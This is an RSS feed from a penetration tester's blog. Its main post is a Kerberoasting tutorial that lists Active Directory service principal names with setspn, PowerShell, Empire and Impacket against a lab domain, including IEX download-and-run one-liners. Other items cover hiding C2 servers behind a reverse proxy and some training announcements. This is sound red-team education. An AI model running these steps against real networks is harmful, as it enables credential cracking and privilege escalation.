<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Room362</title>
    <link>http://room362.com/</link>
    <description>Recent content on Room362</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
    <lastBuildDate>Fri, 20 May 2016 07:35:28 -0500</lastBuildDate>
    <atom:link href="http://room362.com/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Kerberoasting - Part 1</title>
      <link>http://room362.com/post/2016/kerberoast-pt1/</link>
      <pubDate>Fri, 20 May 2016 07:35:28 -0500</pubDate>
      
      <guid>http://room362.com/post/2016/kerberoast-pt1/</guid>
      <description>

&lt;p&gt;&lt;strong&gt;Previous works:&lt;/strong&gt; There has been a number of differnet blog posts, presentations and projects that have happened before this post and I will reference a number of them during the post and at the end have a link to all that I know about. If you know of any works on this subject that I am missing please submit a comment below and I&amp;rsquo;ll will be sure to reference it.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Attacker KB Link:&lt;/strong&gt; (to be updated later)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Common Findings DB Link:&lt;/strong&gt; (to be updated later)&lt;/p&gt;

&lt;h2 id=&#34;what-are-spns:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;What are SPNs&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/ms677949(v=vs.85).aspx&#34;&gt;Service Principal Names&lt;/a&gt; (SPNs) are:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account.&amp;rdquo; - MSDN&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Basically mapping a service running on a server to an account it&amp;rsquo;s running as so that it can do / accept kerberos authentication. Normally, these services, like &amp;ldquo;CIFS&amp;rdquo; (Windows Shares) run under the context of the computer account.&lt;/p&gt;

&lt;h2 id=&#34;why-would-they-be-associated-with-users:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;Why would they be associated with users?&lt;/h2&gt;

&lt;p&gt;I won&amp;rsquo;t say that this is the reason for the change, but for a long time Information Security professionals (and bad guys) have exploited the idea that services run as the all powerful &lt;strong&gt;&amp;ldquo;NT AUTHORITY\SYSTEM&amp;rdquo;&lt;/strong&gt; account. For those who don&amp;rsquo;t know, this means that if someone exploits one of those services, they are basically ROOT on that machine in the Windows world.&lt;/p&gt;

&lt;p&gt;One of the ways that Microsoft has enabled system administrators and software developers to step away from this paradigm is to create the &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx&#34;&gt;NT AUTHORITY\NETWORK SERVICE&lt;/a&gt; and &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx&#34;&gt;NT AUTHORITY\LOCAL SERVICE&lt;/a&gt; accounts. This allowed basic permissions and are great alternatives. However, these accounts, while perfectly limited, did now have any authentication abilities on the network. So, system administrators started using domain accounts to run services. This is where things go wrong again.&lt;/p&gt;

&lt;p&gt;Yes, I know there is such a thing as &lt;a href=&#34;https://technet.microsoft.com/en-us/library/dd560633(v=ws.10).aspx&#34;&gt;Managed Service Accounts&lt;/a&gt; now (introduced in 2011 with a Windows Server 2008 R2 update) and spoiler alert, that&amp;rsquo;s the fix to the issue we will be discussing below and in the next few parts, but even MSAs have an issue that I&amp;rsquo;ll discuss in the last section of this series.&lt;/p&gt;

&lt;h2 id=&#34;why-should-i-care:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;Why should I care?&lt;/h2&gt;

&lt;p&gt;Any valid domain user can request a kerberos ticket for any domain service (or even services outside the domain as long as there is a trust there). Once the ticket is received password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as. The users running these services usually are at the very least administrators on the computers for which they are a service on, but more commonly are some sort of administrative account (Domain Admins).&lt;/p&gt;

&lt;h2 id=&#34;listing-spns:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;Listing SPNs&lt;/h2&gt;

&lt;p&gt;Ok, so, now you know the background and why you want to do this attack,  but how do we go about listing what SPNs are out there for the domain you are on. There are a ton of ways to do this:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Just use the built in &lt;code&gt;SetSPN.exe&lt;/code&gt; built into Windows&lt;/li&gt;
&lt;li&gt;Use the &lt;a href=&#34;https://github.com/nullbind/Powershellery/tree/master/Stable-ish/Get-SPN&#34;&gt;Get-SPN.ps1&lt;/a&gt; that &lt;a href=&#34;https://twitter.com/_nullbind&#34;&gt;@_nullbind&lt;/a&gt; (Scott Sutherland) posted about on the NetSPI blog in a post titled &lt;a href=&#34;https://blog.netspi.com/faster-domain-escalation-using-ldap/&#34;&gt;Faster Domain Escalation using LDAP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Use the &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire&#34;&gt;PowerShell Empire&lt;/a&gt; &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/situational_awareness/network/get_spn.py&#34;&gt;port of @_nullbind&amp;rsquo;s Get-SPN powershell script&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Use &lt;a href=&#34;https://twitter.com/timmedin&#34;&gt;Tim Medin - @timmedin&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs&#34;&gt;GetUserSPNs VB script&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Use &lt;a href=&#34;https://twitter.com/timmedin&#34;&gt;Tim Medin - @timmedin&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1&#34;&gt;GetUserSPNs PowerShell script&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Use &lt;a href=&#34;https://github.com/CoreSecurity/impacket&#34;&gt;Impacket&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;GetUserSPN.py&lt;/a&gt; - unlike the other tools and techniques, this one executes without the advantage of the Windows tokes, so you are going to need credentials, but this is also the advantage as you are not loading anything on disk or executing anything through the use of cmd.exe or powershell.exe&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;1-setspn:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;1. SetSPN&lt;/h3&gt;

&lt;p&gt;SetSPN is a tool built into Windows and will do that job perfectly just as Tim Medin describes in his &lt;a href=&#34;http://www.irongeek.com/i.php?page=videos/derbycon4/t120-attacking-microsoft-kerberos-kicking-the-guard-dog-of-hades-tim-medin&#34;&gt;presentation&lt;/a&gt; and &lt;a href=&#34;https://github.com/nidem/kerberoast&#34;&gt;Kerberoast Github repo&lt;/a&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\&amp;gt;setspn -t sittingduck -q */*
Checking domain DC=sittingduck,DC=info
CN=DC1,OU=Domain Controllers,DC=sittingduck,DC=info
        TERMSRV/DC1
        TERMSRV/DC1.sittingduck.info
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC1.sittingduck.info
        ldap/DC1.sittingduck.info/DomainDnsZones.sittingduck.info
        ldap/DC1.sittingduck.info/ForestDnsZones.sittingduck.info
        DNS/DC1.sittingduck.info
        GC/DC1.sittingduck.info/sittingduck.info
        RestrictedKrbHost/DC1.sittingduck.info
        RestrictedKrbHost/DC1
        RPC/ebee5e45-e3a3-481d-bf6c-29f3833e2392._msdcs.sittingduck.info
        HOST/DC1/SITTINGDUCK
        HOST/DC1.sittingduck.info/SITTINGDUCK
        HOST/DC1
        HOST/DC1.sittingduck.info
        HOST/DC1.sittingduck.info/sittingduck.info
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/ebee5e45-e3a3-481d-bf6c-29f3833e2392/sittingduck.info
        ldap/DC1/SITTINGDUCK
        ldap/ebee5e45-e3a3-481d-bf6c-29f3833e2392._msdcs.sittingduck.info
        ldap/DC1.sittingduck.info/SITTINGDUCK
        ldap/DC1
        ldap/DC1.sittingduck.info
        ldap/DC1.sittingduck.info/sittingduck.info
CN=krbtgt,CN=Users,DC=sittingduck,DC=info
        kadmin/changepw
CN=Uber User,CN=Users,DC=sittingduck,DC=info
        http/win10.sittingduck.info
CN=WIN7,CN=Computers,DC=sittingduck,DC=info
        RestrictedKrbHost/WIN7
        HOST/WIN7
        RestrictedKrbHost/WIN7.sittingduck.info
        HOST/WIN7.sittingduck.info
CN=WIN2K8R2,OU=Domain Controllers,DC=sittingduck,DC=info
        TERMSRV/win2k8r2.sittingduck.info
        TERMSRV/WIN2K8R2
        ldap/WIN2K8R2
        ldap/win2k8r2.sittingduck.info
        ldap/win2k8r2.sittingduck.info/DomainDnsZones.sittingduck.info
        ldap/win2k8r2.sittingduck.info/ForestDnsZones.sittingduck.info
        ldap/win2k8r2.sittingduck.info/sittingduck.info
        ldap/win2k8r2.sittingduck.info/SITTINGDUCK
        ldap/cb4e0d50-5fc3-4900-9bc6-3d097d877ec4._msdcs.sittingduck.info
        ldap/WIN2K8R2/SITTINGDUCK
        HOST/win2k8r2.sittingduck.info/sittingduck.info
        GC/win2k8r2.sittingduck.info/sittingduck.info
        HOST/win2k8r2.sittingduck.info/SITTINGDUCK
        HOST/WIN2K8R2/SITTINGDUCK
        DNS/win2k8r2.sittingduck.info
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/cb4e0d50-5fc3-4900-9bc6-3d097d877ec4/sittingduck.info
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/win2k8r2.sittingduck.info
        WSMAN/win2k8r2
        WSMAN/win2k8r2.sittingduck.info
        RestrictedKrbHost/WIN2K8R2
        HOST/WIN2K8R2
        RestrictedKrbHost/WIN2K8R2.sittingduck.info
        HOST/WIN2K8R2.sittingduck.info
CN=WIN10,CN=Computers,DC=sittingduck,DC=info
        RestrictedKrbHost/WIN10
        HOST/WIN10
        RestrictedKrbHost/win10.sittingduck.info
        HOST/win10.sittingduck.info
CN=CA,CN=Computers,DC=sittingduck,DC=info
        WSMAN/CA
        WSMAN/CA.sittingduck.info
        RestrictedKrbHost/CA
        HOST/CA
        RestrictedKrbHost/CA.sittingduck.info
        HOST/CA.sittingduck.info
CN=MSSQL Service Admin,CN=Users,DC=sittingduck,DC=info
        MSSQLSvc/WIN2K8R2.sittingduck.info

Existing SPN found!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Each line that starts with &amp;ldquo;CN&amp;rdquo; is an account&amp;rdquo; and the SPNs under it are the ones associated with that account. Lots of great information can be determined just from the output of this command. Even though for cracking purposes we only want the SPNs associated with possibly weak password accounts (usually only User accounts), we should still pull this information down.&lt;/p&gt;

&lt;h3 id=&#34;get-spn:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;Get-SPN&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href=&#34;https://github.com/nullbind/Powershellery/tree/master/Stable-ish/Get-SPN&#34;&gt;nullbind&amp;rsquo;s Get-SPN folder in the Powershellery repo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This module gives you a lot more information than SetSPN did. Having the PasswordLastSet and LastLogon helps to figure out when and &lt;em&gt;if&lt;/em&gt; an account has ever been used. In the example below the &amp;ldquo;sqladmin01&amp;rdquo; account has never logged on and was created recently. If this password cracks then there is a good chance that it is some common password set when setting up accounts&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; As of this writing, this module only works with PowerShell 3.0+&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; IEX (New-Object Net.WebClient).DownloadString(&amp;quot;https://raw.githubusercontent.com/
nullbind/Powershellery/master/Stable-ish/Get-SPN/Get-SPN.psm1&amp;quot;)
PS C:\&amp;gt; Get-SPN -type service -search &amp;quot;MSSQL*&amp;quot;


Name            : MSSQL Service Admin
SAMAccount      : sqladmin01
Description     :
UserPrincipal   : sqladmin01@sittingduck.info
DN              : CN=MSSQL Service Admin,CN=Users,DC=sittingduck,DC=info
Created         : 5/13/2016 11:13:20 PM
LastModified    : 5/13/2016 11:13:28 PM
PasswordLastSet : 5/13/2016 7:13:20 PM
AccountExpires  : &amp;lt;Never&amp;gt;
LastLogon       : 12/31/1600 7:00:00 PM
GroupMembership :
SPN Count       : 1

ServicePrincipalNames (SPN):
MSSQLSvc/WIN2K8R2.sittingduck.info

&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;powershell-empire:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;PowerShell Empire&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/situational_awareness/network/get_spn.py&#34;&gt;PowerShell Empire get_spn module&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This module basically just incorporates the script from above.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; As of this writing, this module only works with PowerShell 3.0+&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(Empire: situational_awareness/network/get_spn) &amp;gt; info

           Name: Get-SPN
         Module: situational_awareness/network/get_spn
     NeedsAdmin: False
      OpsecSafe: True
   MinPSVersion: 2
     Background: True
OutputExtension: None

Authors:
  @_nullbind

Description:
  Displays Service Principal Names (SPN) for domain accounts
  based on SPN service name, domain account, or domain group
  via LDAP queries.

Options:

  Name   Required    Value                     Description
  ----   --------    -------                   -----------
  Search False       MSSQL*                    Search string for group, username, or
                                               service name. Wildcards accepted.
  Type   False       service                   &#39;group&#39;, &#39;user&#39;, or &#39;service&#39;
  Agent  True                                  Agent to run module on.

(Empire: situational_awareness/network/get_spn) &amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;listing-user-spns:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;Listing User SPNs&lt;/h2&gt;

&lt;h3 id=&#34;getuserspns-vbs:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;GetUserSPNs.vbs&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs&#34;&gt;Kerberoast&amp;rsquo;s GetUserSPNs.vbs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;GetUserSPNs was the first script to focus only on accounts that were Users. When you are looking at a network that has 40,000+ Windows boxes and all of the has the &amp;ldquo;HOST&amp;rdquo; SPN, it&amp;rsquo;s a lot to trudge through. This script cuts the fat and just gives you the list of SPNs that have a much higher chance of having their accounts cracked.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\temp&amp;gt;cscript GetUserSPNs.vbs
Microsoft (R) Windows Script Host Version 5.8
Copyright (C) Microsoft Corporation. All rights reserved.

CN=Uber User,CN=Users,DC=sittingduck,DC=info
User Logon: uberuser
-- http/win10.sittingduck.info

CN=krbtgt,CN=Users,DC=sittingduck,DC=info
User Logon: krbtgt
-- kadmin/changepw

CN=MSSQL Service Admin,CN=Users,DC=sittingduck,DC=info
User Logon: sqladmin01
-- MSSQLSvc/WIN2K8R2.sittingduck.info
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;getuserspns-ps1:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;GetUserSPNs.ps1&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1&#34;&gt;Kerberoast&amp;rsquo;s GetUserSPNs.ps1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I really like this script because it tells you the time the password was last set. This allows for you to make educated selections on which accounts to attack with your password cracking. (More hashes needed to crack, the longer it takes)&lt;/p&gt;

&lt;p&gt;Below I use the &lt;code&gt;IEX&lt;/code&gt; (Invoke-Expression) command in PowerShell to download and run the PowerShell script directly from Tim&amp;rsquo;s repository, but you could just as easily upload it and run it.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercon
tent.com/nidem/kerberoast/master/GetUserSPNs.ps1&#39;)

ServicePrincipalNam Name                MemberOf            PasswordLastSet
e
------------------- ----                --------            ---------------
http/win10.sitti... Uber User           CN=Domain Admins... 11/10/2015 11:47...
kadmin/changepw     krbtgt              CN=Denied RODC P... 11/10/2015 6:18:...
MSSQLSvc/WIN2K8R... MSSQL Service Admin                     5/13/2016 7:13:2...
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;impacket:f4dc971efa8af1de091fc86f78f81bff&#34;&gt;Impacket&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;Impacket&amp;rsquo;s GetUserSPNs.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Impacket is a recent addition to the list of tools that perform SPN listing. &lt;a href=&#34;https://github.com/CoreSecurity/impacket/pull/153&#34;&gt;Pull request #153 - TGS-Response code to work with windows AD&lt;/a&gt; was all it took to motivate &lt;a href=&#34;https://twitter.com/agsolino&#34;&gt;@agsolino&lt;/a&gt; into making an example script and while &lt;a href=&#34;https://github.com/skelsec/PyKerberoast&#34;&gt;PyKerberoast&lt;/a&gt; by &lt;a href=&#34;https://twitter.com/skelsec&#34;&gt;@skelsec&lt;/a&gt; came first, it doesn&amp;rsquo;t have a plain &amp;ldquo;list&amp;rdquo; function so I wanted to save it for the extraction post.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@wpad:~/impacket/examples# ./GetUserSPNs.py -dc-ip 192.168.168.10 sittingduck.info/notanadmin
Impacket v0.9.15-dev - Copyright 2002-2016 Core Security Technologies

Password:
ServicePrincipalName                Name        MemberOf                                          PasswordLastSet
----------------------------------  ----------  ------------------------------------------------  -------------------
http/win10.sittingduck.info         uberuser    CN=Domain Admins,CN=Users,DC=sittingduck,DC=info  2015-11-10 23:47:21
MSSQLSvc/WIN2K8R2.sittingduck.info  sqladmin01                                                    2016-05-13 19:13:20
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And that is it for now. We have listed all of the SPNs or just the ones we needed. In Part 2 we will make requests for the SPN tickets we want.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>BlackHat USA 2016</title>
      <link>http://room362.com/post/2016/blackhat-usa-2016/</link>
      <pubDate>Sun, 01 May 2016 07:35:28 -0500</pubDate>
      
      <guid>http://room362.com/post/2016/blackhat-usa-2016/</guid>
      <description>&lt;p&gt;Once again, &lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;@egyp7&lt;/a&gt; and I will be teaching both our &lt;a href=&#34;https://www.blackhat.com/us-16/training/abilities-inc-metasploit-basics.html&#34;&gt;Metasploit Basics&lt;/a&gt; course as well as the &lt;a href=&#34;https://www.blackhat.com/us-16/training/abilities-inc-metasploit-mastery.html&#34;&gt;Mastery Course&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://www.blackhat.com/us-16/training/index.html&#34;&gt;&lt;img src=&#34;http://room362.com/images/2016/bh16usa.png&#34; alt=&#34;&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Metasploit Minute</title>
      <link>http://room362.com/post/2016/metasploit-minute/</link>
      <pubDate>Mon, 04 Apr 2016 15:00:00 -0400</pubDate>
      
      <guid>http://room362.com/post/2016/metasploit-minute/</guid>
      <description>&lt;p&gt;Metasploit Minute Season 6 is on the air! I know we have been away for a long
while. The first episode is posted &lt;a href=&#34;https://www.patreon.com/posts/5083466&#34;&gt;https://www.patreon.com/posts/5083466&lt;/a&gt; each Monday a link will be posted on the Patreon site, or if you find RSS feeds easier, you can find it over at &lt;a href=&#34;http://metasploitminute.com&#34;&gt;http://metasploitminute.com&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Another Blogging Platform</title>
      <link>http://room362.com/post/2016/another-blogging-platform/</link>
      <pubDate>Sat, 26 Mar 2016 13:43:09 -0400</pubDate>
      
      <guid>http://room362.com/post/2016/another-blogging-platform/</guid>
      <description>&lt;p&gt;Yes yes yes, I know, another platform, but guess what, it&amp;rsquo;s my blog, so ne-ner-ne-ner-ne-ner&lt;/p&gt;

&lt;p&gt;Hugo removed what I didn&amp;rsquo;t like about Octopress (the generating / pushing of content using a mix of branches and such)&lt;/p&gt;

&lt;p&gt;The reason I moved from Blogger was I just can&amp;rsquo;t stand having to log in and be online to make posts. I love things like MarsEdit for doing offline posts to services like Blogger, but I never could get the formatting right when I was done, especiall for code, so I&amp;rsquo;m back to a markdown based system. Mostly because I like how it displays code (yes yes I know you can add highlightjs to blogger too)&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://gohugo.io/&#34;&gt;&lt;img src=&#34;http://room362.com/images/2016/hugo.png&#34; alt=&#34;&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>2016 Shmoocon Hiring List</title>
      <link>http://room362.com/post/2016/2016-shmoocon-hiring-list/</link>
      <pubDate>Mon, 04 Jan 2016 11:30:44 -0500</pubDate>
      
      <guid>http://room362.com/post/2016/2016-shmoocon-hiring-list/</guid>
      <description>&lt;p&gt;Created the 2016 UNOFFICIAL ShmooCon Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;http://goo.gl/forms/pbYI0TZ9dG&#34;&gt;http://goo.gl/forms/pbYI0TZ9dG&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/15xqphPVEnH7o2urovHWjJiS1VCjdAqcPNB_HS0yRexU/&#34;&gt;https://docs.google.com/spreadsheets/d/15xqphPVEnH7o2urovHWjJiS1VCjdAqcPNB_HS0yRexU/&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;1200&#34; src=&#34;https://docs.google.com/spreadsheets/d/15xqphPVEnH7o2urovHWjJiS1VCjdAqcPNB_HS0yRexU/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34; width=&#34;900&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>Reverse Proxying Attacker Tools</title>
      <link>http://room362.com/post/2015/reverse-proxying-attacker-tools/</link>
      <pubDate>Thu, 31 Dec 2015 16:28:07 -0500</pubDate>
      
      <guid>http://room362.com/post/2015/reverse-proxying-attacker-tools/</guid>
      <description>

&lt;p&gt;Ever want to have all of your C2 go to the same box, have the functionality of Meterpreter, and Empire, while making it so if anyone goes to the actual site of your C2 all they get is something like Google?&lt;/p&gt;

&lt;p&gt;Nginx makes that possible, and instead of making a blog post that will disappear, I&amp;rsquo;ll point you at my combo in my &amp;ldquo;Attacker Knowledge Base&amp;rdquo; site:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://attackerkb.com/Combinations/ReverseProxyAttackTools&#34;&gt;https://attackerkb.com/Combinations/ReverseProxyAttackTools&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;and instead, show you the results once it&amp;rsquo;s setup:&lt;/p&gt;

&lt;h3 id=&#34;metasploit:bd65a90afffcfb1400e418d29fc99e16&#34;&gt;Metasploit:&lt;/h3&gt;

&lt;p&gt;&lt;img src=&#34;http://room362.com/images/2016/reverse_proxy_msf.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;empire:bd65a90afffcfb1400e418d29fc99e16&#34;&gt;Empire:&lt;/h3&gt;

&lt;p&gt;&lt;img src=&#34;http://room362.com/images/2016/reverse_proxy_empire.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Reverse Proxying Attacker Tools</title>
      <link>http://room362.com/post/2015/12-31-reverse-proxying-attacker-tools/</link>
      <pubDate>Thu, 31 Dec 2015 16:28:07 -0500</pubDate>
      
      <guid>http://room362.com/post/2015/12-31-reverse-proxying-attacker-tools/</guid>
      <description>

&lt;p&gt;Ever want to have all of your C2 go to the same box, have the functionality of Meterpreter, and Empire, while making it so if anyone goes to the actual site of your C2 all they get is something like Google?&lt;/p&gt;

&lt;p&gt;Nginx makes that possible, and instead of making a blog post that will disappear, I&amp;rsquo;ll point you at my combo in my &amp;ldquo;Attacker Knowledge Base&amp;rdquo; site:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://attackerkb.com/Combinations/ReverseProxyAttackTools&#34;&gt;https://attackerkb.com/Combinations/ReverseProxyAttackTools&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;and instead, show you the results once it&amp;rsquo;s setup:&lt;/p&gt;

&lt;h3 id=&#34;metasploit:6f3acd67b5d323fe904358e46aa9ef3c&#34;&gt;Metasploit:&lt;/h3&gt;

&lt;p&gt;&lt;img src=&#34;http://room362.com/images/2016/reverse_proxy_msf.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;empire:6f3acd67b5d323fe904358e46aa9ef3c&#34;&gt;Empire:&lt;/h3&gt;

&lt;p&gt;&lt;img src=&#34;http://room362.com/images/2016/reverse_proxy_empire.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Back to Blogger</title>
      <link>http://room362.com/post/2015/back-to-blogger/</link>
      <pubDate>Mon, 07 Sep 2015 07:35:28 -0500</pubDate>
      
      <guid>http://room362.com/post/2015/back-to-blogger/</guid>
      <description>&lt;p&gt;I&amp;rsquo;ve had my fare share of &amp;ldquo;trying new things&amp;rdquo; after &lt;a href=&#34;http://www.squarespace.com&#34;&gt;SquareSpace&lt;/a&gt;. I tried &lt;a href=&#34;http://ghost.org&#34;&gt;Ghost&lt;/a&gt;, &lt;a href=&#34;http://octopress.org/&#34;&gt;Octopress&lt;/a&gt;, &lt;a href=&#34;http://wordpress.com&#34;&gt;Wordpress&lt;/a&gt;, and about 30 others in between. All the blogging platforms I tried had some major issues that I didn&amp;rsquo;t like. I&amp;rsquo;m sure at some point I&amp;rsquo;ll write about them but this post is mostly just to announce I &lt;em&gt;finally&lt;/em&gt; have given up the fight for finding the perfect blogging platform and I&amp;rsquo;m just going to blog on Blogger from now on. One of the main reasons for just giving in was the fact that I noticed that because I was doing conversion of 500+ blog posts every time I wanted to switch platforms I was constantly &amp;ldquo;not in the mood&amp;rdquo; to blog, which kinda negates the whole purpose of finding a new platform. Anywho, rant over. I should be back on the clock now, hopefully bringing cool stuff here in the weeks and months to come.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>pfSense without Internets</title>
      <link>http://room362.com/post/2015/pfsense-without-internets/</link>
      <pubDate>Tue, 17 Feb 2015 12:11:28 -0500</pubDate>
      
      <guid>http://room362.com/post/2015/pfsense-without-internets/</guid>
      <description>&lt;p&gt;A while back I needed to set up a pfSense box for CTF/example stuff that didn&amp;rsquo;t and wouldn&amp;rsquo;t ever have Internet connectivity. Doesn&amp;rsquo;t seem like much of a task right? Just pop it in and go. Problem is that you loose the use of the packages that help make pfSense so awesome.&lt;/p&gt;

&lt;p&gt;Once I figured it out at that time, I made a Forum post so that anyone running into the same issue wouldn&amp;rsquo;t have to struggle as much:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://forum.pfsense.org/index.php?topic=55504.0&#34;&gt;https://forum.pfsense.org/index.php?topic=55504.0&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Most things never disappear from the Internet but I was looking for an old forum post I had bookmarked regarding some persistence methods that I noticed was no longer there since the forum owner had gotten rid of the forum as too much hassle. I get it, but when I went to Archive.org to get saved they didn&amp;rsquo;t have a copy. So this is what this post is for, to save that content just in case it disappears.&lt;/p&gt;

&lt;p&gt;Also, here is a bug report for the &amp;ldquo;issue&amp;rdquo; (been open since 2012):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://redmine.pfsense.org/issues/2586&#34;&gt;http://redmine.pfsense.org/issues/2586&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you are following:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://doc.pfsense.org/index.php/Creating_Your_Own_Package_Repository&#34;&gt;http://doc.pfsense.org/index.php/Creating_Your_Own_Package_Repository&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;and you are getting:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Unable to communicate with 192.168.1.100 Please verify DNS and interface configuration, and that pfSense has functional Internet connectivity.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;because you are using the repo to enable a offline (non internet connected) host to be able to utilize packages all you have to do is:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Go into Services -&amp;gt; DNS Forwarder and add a Host Override&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Host: www
Domain: pfsense.org
IP Address: 127.0.0.1
Description: null routed record to enable offline repo
&lt;/code&gt;&lt;/pre&gt;

